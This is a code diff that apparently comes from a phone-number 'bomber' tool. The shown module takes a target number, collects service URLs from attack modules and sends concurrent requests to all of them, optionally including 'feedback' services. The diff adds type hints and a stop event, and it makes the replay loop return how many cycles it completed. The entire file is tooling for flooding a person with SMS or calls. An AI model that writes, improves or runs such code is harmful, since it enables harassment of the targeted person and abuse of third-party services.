@@ -1,5 +1,7 @@
 from asyncio import ensure_future, gather, run
 from aiohttp import ClientSession
+from typing import Optional
+from threading import Event
 
 from Core.Attack.Services import urls
 from Core.Attack.Feedback_Services import feedback_urls
@@ -19,14 +21,20 @@ async def request(session, url):
 
 
 
-async def async_attacks(number):
+async def async_attacks(number: str):
     async with ClientSession() as session:
         services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
         tasks = [ensure_future(request(session, service)) for service in services]
         await gather(*tasks)
+def start_async_attacks(number: str, replay: int, stop_event: Optional[Event] = None) -> int:
+    """Run attack ``replay`` times and return completed cycles.
 
-
-
-def start_async_attacks(number, replay):
+    If ``stop_event`` is provided and set, the attack stops early.
+    """
+    completed = 0
     for _ in range(int(replay)):
+        if stop_event and stop_event.is_set():
+            break
         run(async_attacks(number))
+        completed += 1
+    return completed
